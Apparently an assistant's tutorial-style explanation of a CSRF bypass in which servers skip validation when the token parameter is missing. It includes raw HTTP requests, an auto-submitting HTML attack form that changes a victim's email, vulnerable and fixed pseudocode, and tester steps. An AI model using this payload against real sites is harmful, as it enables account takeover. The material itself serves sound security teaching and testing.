Let me explain this vulnerability in the simplest way — it's surprisingly common and easy to exploit.

---

## The vulnerability in plain English:

Some developers write their CSRF validation code like this:

```
If the request HAS a CSRF token:
    Check if it's valid
    If invalid → reject
Else (no token present):
    Assume everything is fine → allow
```

This is **backwards security logic**. They're saying: *"If you don't show me your ID, I'll let you in."*

---

## How the normal (secure) flow should work:

```
If the request HAS a CSRF token:
    Check if it's valid
    If invalid → reject
Else (no token present):
    REJECT (because every request should have a token)
```

---

## What the attacker does:

**Normal protected request:**
```
POST /email/change
csrf=50FaWgdOhi9M9w...&email=new@address.com
```
❌ Attacker can't guess the token → attack fails

**Attacker removes the token entirely:**
```
POST /email/change
email=pwned@evil-user.net
```
✅ No `csrf` parameter at all → server says "no token? no problem!" → attack succeeds

---

## Your example (walkthrough):

**The vulnerable request (no token):**
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

Notice: There's NO `csrf=something` parameter. The server sees:
1. No CSRF token in the request
2. "Oh, I guess we don't need to check then"
3. Changes the email to `pwned@evil-user.net`

---

## Attack delivery (HTML form without token):

The attacker creates a normal HTML form, but simply **omits the CSRF token field**:

```html
<!DOCTYPE html>
<html>
<body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
        <input type="hidden" name="email" value="pwned@evil-user.net">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

No token field at all. When submitted, the request has no `csrf` parameter → server bypasses validation.

---

## Why this happens (developer mistake):

**Bad code example (pseudocode):**
```javascript
if (request.hasParameter("csrf")) {
    if (request.getParameter("csrf") !== session.getToken()) {
        reject();
    }
}
// If we get here, either token matched OR no token was sent
// ❌ Missing an "else { reject(); }" block
```

**Good code example:**
```javascript
if (!request.hasParameter("csrf")) {
    reject();  // ✅ Missing token = reject
}
if (request.getParameter("csrf") !== session.getToken()) {
    reject();  // ✅ Wrong token = reject
}
// Only reach here if token exists AND matches
```

---

## Simple analogy:

Imagine a club with a bouncer:

**Good bouncer:**  
"No ID? No entry. Wrong ID? No entry. Only correct ID gets in."

**Bad bouncer (vulnerable):**  
"Let me see your ID... oh, you don't have one? Come on in! Wrong ID? Sorry, can't let you in."

The attacker just **leaves their ID at home** and walks right past.

---

## Key takeaway for testers:

> **Always test requests with the CSRF token completely removed.** Some apps check token validity but forget to check token presence.

**Testing steps:**
1. Capture a request with a CSRF token
2. Delete the entire `csrf` parameter (name + value)
3. Send the request
4. If it works → the site is vulnerable

**What to remove:**
- ❌ Not just `csrf=` (empty value)
- ✅ Remove the whole `csrf=50FaWgdOhi9M9w...` parameter entirely

---

## Quick reference:

| Request | Server behavior (vulnerable) | Result |
|---------|------------------------------|--------|
| `csrf=correct&email=x` | Token valid ✅ | Allowed |
| `csrf=wrong&email=x` | Token invalid ❌ | Rejected |
| `email=x` (no token) | Token missing → skip check | **Allowed (vulnerable)** |